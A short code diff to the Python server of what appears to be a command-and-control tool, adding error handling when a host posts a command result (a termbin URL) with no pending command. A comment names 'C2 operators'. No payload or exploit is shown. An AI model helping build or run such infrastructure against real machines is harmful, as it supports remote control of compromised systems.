@@ -130,12 +130,19 @@ def api_add_answer(host, termbin_url):
 	host_id = select_db(conn, "SELECT host_id FROM hosts WHERE hostname = ?", (host,))
 	host_id = host_id[0][0]
 
-	command_id = select_db(conn, "SELECT command_id FROM commands WHERE fk_host_id = ? AND status = 0 ORDER BY command_id ASC LIMIT 1", (host_id,))
-	command_id = command_id[0][0]
+	try:
+		command_id = select_db(conn, "SELECT command_id FROM commands WHERE fk_host_id = ? AND status = 0 ORDER BY command_id ASC LIMIT 1", (host_id,))
+		command_id = command_id[0][0]
 
-	success = insert_db(conn, "UPDATE commands SET answer_url = ?, status = 1, answer_time = strftime('%d-%m-%Y %H:%M:%S','now', 'localtime') WHERE command_id = ? AND fk_host_id = ?", (termbin_url, command_id, host_id));
+		success = insert_db(conn, "UPDATE commands SET answer_url = ?, status = 1, answer_time = strftime('%d-%m-%Y %H:%M:%S','now', 'localtime') WHERE command_id = ? AND fk_host_id = ?", (termbin_url, command_id, host_id));
 
-	return str(success)
+		return str(success)
+	except IndexError as err:
+		# a client sent an answer without C2 operators setting up a command
+		return "error - who asked ?"
+
+
+
 # ===============================================
 
 
